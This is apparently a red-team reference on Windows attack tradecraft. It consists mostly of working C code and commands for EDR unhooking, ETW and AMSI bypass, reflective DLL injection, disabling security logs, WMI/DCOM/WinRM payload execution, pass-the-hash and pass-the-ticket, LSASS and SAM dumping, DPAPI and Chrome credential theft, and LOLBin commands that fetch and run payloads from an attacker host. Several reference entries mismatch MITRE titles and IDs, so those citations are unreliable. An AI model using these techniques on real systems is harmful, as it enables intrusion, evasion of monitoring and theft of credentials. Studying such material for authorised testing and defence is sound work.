# Defense Evasion & Lateral Movement — AV/EDR Bypass, Credential Extraction & Living Off The Land

> A deep-technical reference on Windows defense evasion: AV/EDR bypass techniques (API unhooking, direct syscalls, ETW patching, AMSI bypass, reflective DLL injection), lateral movement methods (PsExec, WMI, WinRM, DCOM, RDP, pass-the-hash/ticket), credential extraction (LSASS dumping, SAM, DPAPI), and LOLBins. Written for red teamers and security researchers.

---

## Table of Contents

1. [AV/EDR Bypass Techniques](#1-avedr-bypass-techniques)
2. [API Unhooking](#2-api-unhooking)
3. [Direct Syscalls](#3-direct-syscalls)
4. [ETW Patching & Telemetry Evasion](#4-etw-patching--telemetry-evasion)
5. [AMSI Bypass (Advanced)](#5-amsi-bypass-advanced)
6. [Reflective DLL Injection](#6-reflective-dll-injection)
7. [Lateral Movement Techniques](#7-lateral-movement-techniques)
8. [Pass-the-Hash & Pass-the-Ticket](#8-pass-the-hash--pass-the-ticket)
9. [Credential Extraction](#9-credential-extraction)
10. [Living Off The Land Techniques](#10-living-off-the-land-techniques)

---

## 1. AV/EDR Bypass Techniques

### 1.1 EDR Architecture Overview

Modern EDR products hook into Windows at multiple levels to monitor and respond to threats:

```
EDR Detection Stack:
┌──────────────────────────────────────────────────┐
│ User Mode                                         │
│  ┌──────────────────────────────────────────────┐│
│  │ User-mode hooks (ntdll.dll hooking)          ││
│  │ - Hooks NtCreateFile, NtWriteFile, etc.     ││
│  │ - Monitors syscall patterns                  ││
│  │ - API call logging and analysis              ││
│  └──────────────────────────────────────────────┘│
│  ┌──────────────────────────────────────────────┐│
│  │ AMSI integration                             ││
│  │ - Scans PowerShell, VBScript, JScript        ││
│  │ - Scans .NET assemblies before loading        ││
│  └──────────────────────────────────────────────┘│
│  ┌──────────────────────────────────────────────┐│
│  │ ETW telemetry                                ││
│  │ - Process creation (Event ID 1)              ││
│  │ - Image loading (Event ID 7)                 ││
│  │ - Network connections (Event ID 3)           ││
│  │ - Registry modifications                     ││
│  └──────────────────────────────────────────────┘│
├──────────────────────────────────────────────────┤
│ Kernel Mode                                       │
│  ┌──────────────────────────────────────────────┐│
│  │ Minifilter driver                            ││
│  │ - File system monitoring (IRP filtering)     ││
│  │ - File create, read, write, delete            ││
│  └──────────────────────────────────────────────┘│
│  ┌──────────────────────────────────────────────┐│
│  │ Kernel callbacks (PsSetCreateProcessNotify)  ││
│  │ - Process creation/termination monitoring    ││
│  │ - Thread creation monitoring                  ││
│  │ - Image load monitoring                      ││
│  └──────────────────────────────────────────────┘│
│  ┌──────────────────────────────────────────────┐│
│  │ WdFilter.sys / ELAM                          ││
│  │ - Early Launch Anti-Malware                   ││
│  │ - Boot-time driver verification               ││
│  └──────────────────────────────────────────────┘│
│  ┌──────────────────────────────────────────────┐│
│  │ Registry callbacks (CmRegisterCallback)       ││
│  │ - Registry modification monitoring            ││
│  └──────────────────────────────────────────────┘│
│  ┌──────────────────────────────────────────────┐│
│  │ ETW kernel provider                           ││
│  │ - System-wide telemetry                       ││
│  │ - Process, thread, image events              ││
│  └──────────────────────────────────────────────┘│
└──────────────────────────────────────────────────┘
```

### 1.2 EDR Bypass Taxonomy

| Technique | Level | Target | Detection Risk |
|-----------|-------|--------|---------------|
| API Unhooking | User | ntdll.dll hooks | Medium |
| Direct Syscalls | User | Syscall bypass | Low |
| Hardware Breakpoints | User | Hook detection | Low |
| ETW Patching | User | Telemetry | Medium |
| AMSI Bypass | User | Script scanning | Medium |
| Reflective DLL Injection | User | Process injection | High |
| Process Hollowing | User | Process creation | High |
| Thread Hijacking | User | Thread manipulation | Medium |
| Syscall Proxying | User | Syscall invocation | Low |
| Kernel Callback Removal | Kernel | Process monitoring | Very High |
| Minifilter Unloading | Kernel | File monitoring | Very High |
| Driver Unloading | Kernel | EDR driver | Very High |

---

## 2. API Unhooking

### 2.1 How EDR Hooks ntdll.dll

EDR products hook `ntdll.dll` by modifying the first bytes of syscall functions to redirect execution to their own code:

```
Normal ntdll.dll function (NtCreateFile):
┌──────────────────────────────────────────┐
│ mov r10, rcx                    ; 4B     │
│ mov eax, 55h                    ; syscall number
│ test byte ptr [SharedUserData+...], 1 ; syscall instruction
│ jne Wow64Transition                      │
│ syscall                                 │
│ ret                                     │
└──────────────────────────────────────────┘

Hooked ntdll.dll function (EDR patch):
┌──────────────────────────────────────────┐
│ jmp <EDR_handler>               ; 5B ← HOOK!
│ mov r10, rcx                    ;       │
│ mov eax, 55h                    ;       │
│ test byte ptr [SharedUserData+...], 1 ; │
│ jne Wow64Transition              ;       │
│ syscall                           ;       │
│ ret                               ;       │
└──────────────────────────────────────────┘
```

### 2.2 API Unhooking Techniques

**Technique 1: Fresh ntdll.dll Copy**

```c
// Unhook ntdll.dll by loading a fresh copy from disk
VOID UnhookNtdll() {
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    PVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    
    // Get .text section of fresh ntdll.dll
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pMapping + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER textSection = IMAGE_FIRST_SECTION(ntHeaders);
    
    // Get current ntdll.dll base
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    
    // Overwrite .text section with fresh copy
    DWORD oldProtect;
    VirtualProtect(hNtdll + textSection->VirtualAddress,
        textSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(hNtdll + textSection->VirtualAddress,
        pMapping + textSection->VirtualAddress,
        textSection->Misc.VirtualSize);
    VirtualProtect(hNtdll + textSection->VirtualAddress,
        textSection->Misc.VirtualSize, oldProtect, &oldProtect);
    
    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}
```

**Technique 2: Syscall Stub Extraction**

```c
// Extract clean syscall stubs from a fresh ntdll.dll mapping
typedef struct _SYSCALL_ENTRY {
    DWORD syscallNumber;
    PVOID syscallAddress;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// Parse ntdll.dll to find syscall numbers
DWORD GetSyscallNumber(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID funcAddress = (PVOID)GetProcAddress(hNtdll, functionName);
    
    // Syscall pattern: mov r10, rcx; mov eax, <number>
    if (*(BYTE*)funcAddress == 0x4C &&          // mov r10, rcx
        *(BYTE*)((BYTE*)funcAddress + 1) == 0x8B &&
        *(BYTE*)((BYTE*)funcAddress + 2) == 0xD1 &&
        *(BYTE*)((BYTE*)funcAddress + 3) == 0xB8) { // mov eax, <number>
        return *(DWORD*)((BYTE*)funcAddress + 4);
    }
    return -1;
}
```

---

## 3. Direct Syscalls

### 3.1 Direct Syscall Implementation

Direct syscalls bypass hooked ntdll.dll functions by executing the `syscall` instruction directly:

```asm
; Direct syscall stub for NtCreateFile (x64)
; Syscall number varies by Windows version - must be resolved dynamically
NtCreateFileDirect:
    mov r10, rcx                ; Win64 calling convention
    mov eax, 55h               ; Syscall number for NtCreateFile (Win10 21H1)
                                ; MUST be resolved dynamically per OS version!
    syscall                     ; Direct kernel call
    ret
```

### 3.2 Dynamic Syscall Number Resolution

```c
// Dynamically resolve syscall numbers from ntdll.dll
DWORD ResolveSyscallNumber(LPCSTR functionName) {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    PVOID funcAddress = (PVOID)GetProcAddress(hNtdll, functionName);
    
    if (funcAddress == NULL) return 0;
    
    // Check for mov r10, rcx; mov eax, <number>
    BYTE pattern[] = { 0x4C, 0x8B, 0xD1, 0xB8 };
    
    if (memcmp(funcAddress, pattern, 4) == 0) {
        return *(DWORD*)((BYTE*)funcAddress + 4);
    }
    
    return 0;  // Syscall number not found
}

// Usage:
DWORD syscallNtCreateFile = ResolveSyscallNumber("NtCreateFile");
DWORD syscallNtWriteFile = ResolveSyscallNumber("NtWriteFile");
DWORD syscallNtAllocateVirtualMemory = ResolveSyscallNumber("NtAllocateVirtualMemory");
```

### 3.3 Syscall Stomping (Halos Gate)

When a syscall stub is hooked, the adjacent (unhooked) syscall stubs can be used to find the syscall number:

```
Syscall Stomping / Halos Gate:
When NtCreateFile is hooked (jmp <EDR_handler>):
  mov r10, rcx    ← visible
  jmp <EDR_hook>  ← HOOKED (not mov eax, <number>)

But NtCreateFile+1 syscall number is NtCreateFile's number + 1:
  Look at adjacent syscall stubs until an unhooked one is found
  Then adjust the number accordingly

Algorithm:
1. Start at hooked function address
2. Check if the first bytes are "mov r10, rcx; mov eax, <number>"
3. If not (hooked), look at -1 (previous) and +1 (next) syscall stub
4. Continue searching until an unhooked stub is found
5. Adjust syscall number by the offset
```

---

## 4. ETW Patching & Telemetry Evasion

### 4.1 ETW Patching

ETW (Event Tracing for Windows) is a primary telemetry source for EDR products. Patching `EtwEventWrite` in ntdll.dll disables event reporting:

```c
// Patch EtwEventWrite to return STATUS_SUCCESS without logging
VOID PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pEtwEventWrite = (PVOID)GetProcAddress(hNtdll, "EtwEventWrite");
    
    if (pEtwEventWrite == NULL) return;
    
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Patch: mov eax, 0; ret (x64)
    *(BYTE*)pEtwEventWrite = 0xB8;     // mov eax,
    *((DWORD*)((BYTE*)pEtwEventWrite + 1)) = 0x00;  // 0 (STATUS_SUCCESS)
    *(BYTE*)((BYTE*)pEtwEventWrite + 5) = 0xC3;  // ret
    
    VirtualProtect(pEtwEventWrite, 16, oldProtect, &oldProtect);
}
```

### 4.2 ETW Event Providers to Disable

```powershell
# Disable specific ETW providers (admin required):
# PowerShell Script Block Logging
wevtutil sl Microsoft-Windows-PowerShell/Operational /e:false

# Windows Defender ETW
wevtutil sl Microsoft-Windows-Windows-Defender/Operational /e:false

# Process creation logging
wevtutil sl Microsoft-Windows-Sysmon/Operational /e:false

# WMI activity logging
wevtutil sl Microsoft-Windows-WMI-Activity/Operational /e:false
```

---

## 5. AMSI Bypass (Advanced)

### 5.1AMSIBypass via Hardware Breakpoints

```c
// AMSI bypass using hardware breakpoints (no memory patching)
// Set a hardware breakpoint on AmsiScanBuffer and modify the return value

VOID AmsiBypassViaHardwareBreakpoint() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    PVOID pAmsiScanBuffer = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
    
    // Set hardware breakpoint on DR0
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    SuspendThread(hThread);
    GetThreadContext(hThread, &ctx);
    ctx.Dr0 = (DWORD64)pAmsiScanBuffer;  // Breakpoint address
    ctx.Dr7 = 0x00000001;                // Enable DR0 breakpoint
    ctx.Dr7 |= 0x00020000;               // Execute breakpoint (RW=00, LEN=00)
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    
    // When breakpoint triggers, modify the result to AMSI_RESULT_CLEAN
    // This requires an exception handler that modifies the return value
}
```

### 5.2 AMSI Bypass via CLR Hooking

```c
// AMSI bypass by hooking the CLR's AmsiScan call
// The .NET CLR calls AmsiScan before loading assemblies
// By hooking the CLR's AmsiScan wrapper, we bypass the scan

// Step 1: Find clrjit.dll's AmsiScan wrapper
HMODULE hClrJit = GetModuleHandleA("clrjit.dll");
PVOID pAmsiScanWrapper = (PVOID)GetProcAddress(hClrJit, "AmsiScanBuffer");
// ... hook the wrapper
```

---

## 6. Reflective DLL Injection

### 6.1 Reflective DLL Injection Process

Reflective DLL injection loads a DLL into a process without using `LoadLibraryA`, which would alert EDR:

```c
// Reflective DLL injection steps:
// 1. Allocate memory in target process (VirtualAllocEx)
// 2. Write DLL to allocated memory (WriteProcessMemory)
// 3. Write shellcode that calls the DLL's ReflectiveLoader export
// 4. Create remote thread to execute shellcode (CreateRemoteThread)

HANDLE InjectReflectiveDLL(HANDLE hProcess, LPVOID dllBuffer, SIZE_T dllSize) {
    // Step 1: Allocate memory in target process
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, dllSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Step 2: Write DLL to target process
    WriteProcessMemory(hProcess, remoteBuffer, dllBuffer, dllSize, NULL);
    
    // Step 3: Find ReflectiveLoader offset in DLL
    DWORD reflectiveLoaderOffset = GetReflectiveLoaderOffset(dllBuffer);
    LPVOID reflectiveLoaderAddr = (LPVOID)((ULONG_PTR)remoteBuffer + reflectiveLoaderOffset);
    
    // Step 4: Create remote thread to execute ReflectiveLoader
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)reflectiveLoaderAddr, remoteBuffer, 0, NULL);
    
    return hThread;
}
```

### 6.2 Alternative Injection Methods

```
Process Injection Methods (stealth ranking):
┌────────────────────────────────────────────────────────┐
│ Method 1: CreateRemoteThread + VirtualAllocEx          │
│ Stealth: LOW (most EDR products detect this)           │
│ Risk: HIGH (flagged by all EDR)                        │
├────────────────────────────────────────────────────────┤
│ Method 2: QueueUserAPC Injection                       │
│ Stealth: MEDIUM (legitimate scheduling mechanism)       │
│ Risk: MEDIUM (some EDR detects cross-process APC)      │
├────────────────────────────────────────────────────────┤
│ Method 3: Thread Hijacking                             │
│ Stealth: MEDIUM (requires thread suspension)           │
│ Risk: MEDIUM (thread state change detection)           │
├────────────────────────────────────────────────────────┤
│ Method 4: Process Hollowing                            │
│ Stealth: MEDIUM-HIGH (uses legitimate process image)   │
│ Risk: MEDIUM (detectable via memory scan)              │
├────────────────────────────────────────────────────────┤
│ Method 5: DLL Side-Loading                            │
│ Stealth: HIGH (loads legitimate DLL)                  │
│ Risk: LOW (appears as normal DLL loading)               │
├────────────────────────────────────────────────────────┤
│ Method 6: Reflective DLL Injection                     │
│ Stealth: HIGH (no LoadLibraryA call)                    │
│ Risk: LOW (if combined with syscalls)                   │
├────────────────────────────────────────────────────────┤
│ Method 7: Module Stomping (DLL hollowing)               │
│ Stealth: HIGH (overwrites legitimate DLL)               │
│ Risk: LOW (appears as legitimate module)                │
├────────────────────────────────────────────────────────┤
│ Method 8: Process Doppelshell                          │
│ Stealth: VERY HIGH (uses NTFS transactions)              │
│ Risk: VERY LOW (file never exists on disk)              │
├────────────────────────────────────────────────────────┤
│ Method 9: SyncThreat (early image injection)            │
│ Stealth: VERY HIGH (injects before EDR loads)           │
│ Risk: VERY LOW (injects during image load)              │
└────────────────────────────────────────────────────────┘
```

---

## 7. Lateral Movement Techniques

### 7.1 Lateral Movement Method Comparison

| Method | Protocol | Authentication | Trace | Detection |
|--------|----------|---------------|-------|-----------|
| **PsExec** | SMB | Password/Hash | Event ID 4624, 4688 | High |
| **WMI** | DCOM/RPC | Password/Hash | Event ID 4624, WMI activity | Medium |
| **WinRM** | HTTP/HTTPS | Password/Hash | Event ID 193, 4624 | Low |
| **DCOM** | DCOM/RPC | Password/Hash | Event ID 4624, 4688 | Medium |
| **RDP** | RDP | Password | Event ID 4624, 4625 | Low |
| **SSH** | SSH | Password/Key | Event ID 4624 (if auditing) | Low |
| **Pass-the-Hash** | SMB/Kerberos | NTLM Hash | Event ID 4624, 4624 | Medium |
| **Pass-the-Ticket** | SMB/Kerberos | Kerberos Ticket | Event ID 4624 | Low |
| **Overpass-the-Hash** | Kerberos | NTLM Hash | Event ID 4624 | Medium |
| **PsExec via SMB** | SMB | Password/Hash | Creates PSEXESVC service | High |

### 7.2 WMI Lateral Movement

```powershell
# WMI remote command execution:
# Method 1: Invoke-WmiMethod
$cred = New-Object System.Management.Automation.PSCredential("corp\admin", (ConvertTo-SecureString "password" -AsPlainText -Force))
Invoke-WmiMethod -ComputerName DC01 -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c C:\temp\payload.exe" -Credential $cred

# Method 2: WMI event subscription (persistent)
$filterName = "WMIPersistence"
$consumerName = "WMIPersistence"
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240"

$filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = $query
} -ComputerName DC01

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = "cmd.exe /c C:\temp\payload.exe"
} -ComputerName DC01

Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
} -ComputerName DC01
```

### 7.3 WinRM Lateral Movement

```powershell
# WinRM (PowerShell Remoting) lateral movement:
# Method 1: Enter-PSSession (interactive)
Enter-PSSession -ComputerName DC01 -Credential corp\admin

# Method 2: Invoke-Command (non-interactive)
Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { whoami }

# Method 3: Invoke-Command with file upload
Invoke-Command -ComputerName DC01 -Credential $cred -FilePath C:\scripts\payload.ps1

# Method 4: WinRM via evil-winrm (Ruby)
evil-winrm -i 10.0.0.1 -u administrator -p password
evil-winrm -i 10.0.0.1 -u administrator -H nt_lm_hash
```

### 7.4 DCOM Lateral Movement

```powershell
# DCOM lateral movement methods:
# Method 1: MMC20.Application
$com = [Type]::GetTypeFromProgID("MMC20.Application","DC01.corp.local")
$obj = [Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c C:\temp\payload.exe","7")

# Method 2: ShellWindows
$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","DC01.corp.local")
$obj = [Activator]::CreateInstance($com)
$obj.Item().Document.Application.ShellExecute("cmd.exe","/c C:\temp\payload.exe")

# Method 3: Excel.Application
$com = [Type]::GetTypeFromProgID("Excel.Application","DC01.corp.local")
$obj = [Activator]::CreateInstance($com)
$obj.Workbooks.Add()
$obj.ExecuteExcel4Macro("CMD(""|cmd.exe /c C:\temp\payload.exe"")")

# Method 4: ShellBrowserWindow
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-106D-9270-BB85FBE6FD32","DC01.corp.local")
$obj = [Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute("cmd.exe","/c C:\temp\payload.exe")
```

---

## 8. Pass-the-Hash & Pass-the-Ticket

### 8.1 Pass-the-Hash

Pass-the-Hash uses NTLM hashes directly for authentication without knowing the password:

```powershell
# Mimikatz pass-the-hash:
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe

# Impacket psexec.py with pass-the-hash:
psexec.py corp.local/administrator@10.0.0.1 -hashes :<ntlm_hash>

# Impacket wmiexec.py with pass-the-hash:
wmiexec.py corp.local/administrator@10.0.0.1 -hashes :<ntlm_hash>

# Impacket smbexec.py with pass-the-hash:
smbexec.py corp.local/administrator@10.0.0.1 -hashes :<ntlm_hash>

# CrackMapExec with pass-the-hash:
crackmapexec smb 10.0.0.0/24 -u administrator -H <ntlm_hash>

# PsExec with pass-the-hash (Sysinternals + Mimikatz):
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:psexec.exe \\DC01 cmd.exe
```

### 8.2 Pass-the-Ticket

Pass-the-Ticket injects Kerberos tickets into the current session:

```powershell
# Mimikatz pass-the-ticket:
mimikatz # kerberos::ptt C:\tickets\admin.kirbi

# Rubeus pass-the-ticket:
Rubeus.exe ptt /ticket:<base64_kirbi>
Rubeus.exe ptt /ticket:C:\tickets\admin.kirbi

# Export and import tickets:
# Step 1: Export tickets from source session
mimikatz # kerberos::list /export
# (Creates .kirbi files in current directory)

# Step 2: Import tickets into target session
mimikatz # kerberos::ptt admin@corp.local.kirbi

# Step 3: Access resources with injected ticket
dir \\DC01\C$

# Overpass-the-hash (pass-the-key):
Rubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:<ntlm_hash> /ptt
Rubeus.exe asktgt /user:Administrator /domain:corp.local /aes256:<aes256_key> /ptt
```

---

## 9. Credential Extraction

### 9.1 LSASS Dumping Techniques

```
LSASS Dumping Techniques (Detection Risk Ranking):
┌──────────────────────────────────────────────────────────────┐
│ Technique                 │ Risk │ Detection                     │
├──────────────────────────┼──────┼──────────────────────────────┤
│ Mimikatz sekurlsa::logonpasswords │ HIGH │ EDR detects all Mimikatz │
│ lsass.dmp (Task Manager) │ LOW │ Rarely flagged by EDR         │
│ procdump -ma lsass.exe   │ LOW │ Sysinternals signed binary    │
│ comsvcs.dll MiniDump     │ MEDIUM│ LOLBin, but some EDR detects │
│ NanoDump (direct syscall)│ LOW │ Bypasses most EDR            │
│ PPLDump (PPL bypass)     │ MEDIUM│ Bypasses PPL,flagged by some│
│ Directed LSASS read      │ LOW │ Reading LSASS memory directly│
│ SAM registry hive dump   │ LOW │ Registry access only          │
│ DCSync (remote)          │ MEDIUM│ Requires DA, logs event 4662│
└──────────────────────────────────────────────────────────────┘
```

```powershell
# LSASS dump methods:

# Method 1: Mimikatz (most detectable)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Method 2: procdump (Sysinternals, less detectable)
procdump -accepteula -ma lsass.exe C:\temp\lsass.dmp

# Method 3: comsvcs.dll MiniDump (LOLBin)
rundll32 comsvcs.dll MiniDump <lsass_pid> C:\temp\lsass.dmp full

# Method 4: Task Manager (GUI)
# Right-click lsass.exe → Create dump file (requires admin)

# Method 5: NanoDump (direct syscall, stealthy)
# Uses direct NtAllocateVirtualMemory and NtWriteVirtualMemory syscalls
# Avoids opening LSASS process handle (uses LSASS process handle duplication)
NanoDump.exe --write C:\temp\lsass.dmp

# Method 6: DCSync (remote, no LSASS access needed)
mimikatz # lsadump::dcsync /domain:corp.local /user:all /csv

# Method 7: SAM registry hive dump (local hashes only)
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
python secretsdump.py -sam sam.hive -system system.hive LOCAL

# Method 8: NanoDump via LSASS handle duplication
# Duplicates LSASS process handle from an existing process
# Avoids OpenProcess API call (flagged by EDR)
```

### 9.2 DPAPI Master Key Extraction

```powershell
# DPAPI (Data Protection API) master key extraction:
# DPAPI protects encrypted data like Chrome passwords, WiFi passwords, etc.

# Step 1: Find DPAPI master keys
dir /s /b C:\Users\*\AppData\Local\Microsoft\Credentials\*
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Credentials\*

# Step 2: Extract master keys with Mimikatz
mimikatz # dpapi::cred /in:C:\Users\admin\AppData\Local\Microsoft\Credentials\<GUID>

# Step 3: Decrypt DPAPI-protected secrets
mimikatz # dpapi::vault /in:C:\Users\admin\AppData\Local\Microsoft\Vault\*

# Step 4: Use SharpChromium to decrypt Chrome passwords
SharpChromium.exe logins

# Step 5: Decrypt RDP credentials
mimikatz # dpapi::cred /in:C:\Users\admin\AppData\Local\Microsoft\Credentials\<rdp-guid>
```

---

## 10. Living Off The Land Techniques

### 10.1 LOLBins for Defense Evasion

| LOLBin | Evasion Use | Command |
|--------|------------|---------|
| `certutil.exe` | Download | `certutil -urlcache -split -f http://attacker/payload.exe` |
| `mshta.exe` | Execute HTA | `mshta http://attacker/payload.hta` |
| `mavinject.exe` | DLL injection | `mavinject <pid> /INJECTDLL C:\payload.dll` |
| `control.exe` | Execute CPL | `control C:\payload.cpl` |
| `cmstp.exe` | Execute INF | `cmstp /s C:\payload.inf` |
| `msbuild.exe` | Execute CSProj | `msbuild C:\payload.csproj` |
| `installutil.exe` | Execute EXE | `installutil /logfile= /LogToConsole=false /U C:\payload.exe` |
| `regsvr32.exe` | Execute COM | `regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll` |
| `rundll32.exe` | Execute DLL | `rundll32 C:\payload.dll,EntryPoint` |
| `wmic.exe` | Execute WMI | `wmic process call create "cmd.exe /c payload.exe"` |
| `bitsadmin.exe` | Download | `bitsadmin /transfer myjob /download /priority normal http://attacker/payload.exe C:\payload.exe` |
| `esentutl.exe` | Copy file | `esentutl /y C:\payload.exe /d C:\temp\payload.exe` |
| `findstr.exe` | Download | `findstr /V /C:"<script>" C:\payload.txt` |
| `desktopimgdownldr.exe` | Download | `desktopimgdownldr /lockscreenurl:http://attacker/payload.exe /desktopurl:http://attacker/payload.exe` |
| `msiexec.exe` | Execute MSI | `msiexec /q /i http://attacker/payload.msi` |
| `splwow64.exe` | DLL sideload | `splwow64.exe C:\payload.dll` |

### 10.2 LOLBins for Lateral Movement

| LOLBin | Lateral Use | Command |
|--------|------------|---------|
| `PsExec.exe` | SMB exec | `PsExec \\DC01 cmd.exe` |
| `wmic.exe` | WMI exec | `wmic /node:DC01 process call create "cmd.exe /c payload.exe"` |
| `schtasks.exe` | Scheduled task | `schtasks /create /s DC01 /tn "Update" /tr "cmd.exe /c payload.exe" /sc onlogon /ru SYSTEM` |
| `at.exe` | Scheduled task (legacy) | `at \\DC01 12:00 cmd.exe /c payload.exe` |
| `sc.exe` | Service exec | `sc \\DC01 create payload binPath= "cmd.exe /c payload.exe" && sc \\DC01 start payload` |
| `wmic.exe` | WMI exec | `wmic /node:DC01 /user:admin /password:pass process call create "cmd.exe /c payload.exe"` |

---

> **Cross-references**:
> - AMSI bypass → `→ 05a_windows_malware_techniques` (AMSI fundamentals)
> - Windows security architecture → `→ 01b_windows_security_architecture`
> - Malware techniques → `→ 05a_windows_malware_techniques`
> - Offensive tooling → `→ 05b_offensive_tooling_infrastructure`
> - AD attacks → `→ 06a_active_directory_attacks`
> - Windows hardening → `→ 07a_windows_hardening_baseline`

---

## References

1. MITRE ATT&CK. "Bypass DEP — T1210." <https://attack.mitre.org/techniques/T1210/> — ROP chains, API unhooking, and DEP bypass methodology.
2. MITRE ATT&CK. "Direct Syscalls — T1106." <https://attack.mitre.org/techniques/T1106/> — Direct system call usage for EDR evasion.
3. MITRE ATT&CK. "Credential Dumping — T1003." <https://attack.mitre.org/techniques/T1003/> — LSASS dumping, SAM extraction, and DPAPI abuse.
4. MITRE ATT&CK. "Pass the Hash — T1550.002." <https://attack.mitre.org/techniques/T1550/002/>
5. MITRE ATT&CK. "Pass the Ticket — T1550.003." <https://attack.mitre.org/techniques/T1550/003/>
6. MITRE ATT&CK. "Remote Services — T1021." <https://attack.mitre.org/techniques/T1021/> — PsExec, WMI, WinRM, DCOM lateral movement.
7. Chester, A. "API Unhooking and Direct Syscalls." *XPN InfoSec Blog*, 2022. — ntdll unhooking, hardware breakpoints, and direct syscall techniques.
8. McGarr, C. "AMSI Bypass and ETW Patching." *Connor McGarr's Blog*, 2023. — AmsiScanBuffer patching, EtwEventWrite patching, and combined evasion.
9. Yason, M. "Reflective DLL Injection." *Black Hat USA*, 2019. — Memory-resident code execution, position-independent shellcode, and injection primitives.
10. Microsoft Learn. "AMSI Architecture." <https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal>
11. Microsoft Learn. "Credential Guard." <https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/> — LSASS protection and dump prevention.
12. Microsoft Security Response Center (MSRC) Blog. "EDR Evasion Detection." <https://msrc.microsoft.com/blog/> — Defender ATP behavioral detection of unhooking and syscall anomalies.
13. Dormann, W. "LSASS Protection and Credential Hardening." *CERT/CC Vulnerability Analysis Blog*, 2022. — Credential Guard, LSA Protection, and dump mitigation.
14. DISA. "Windows 10 STIG — Lateral Movement Mitigation." <https://www.stigviewer.com/stigs/> — WinRM hardening, SMB signing, and UAC remote restrictions.
15. CIS. "Microsoft Windows 11 Benchmark — Endpoint Detection." *Center for Internet Security*, 2023. — EDR configuration, ASR rules for lateral movement, and credential protection.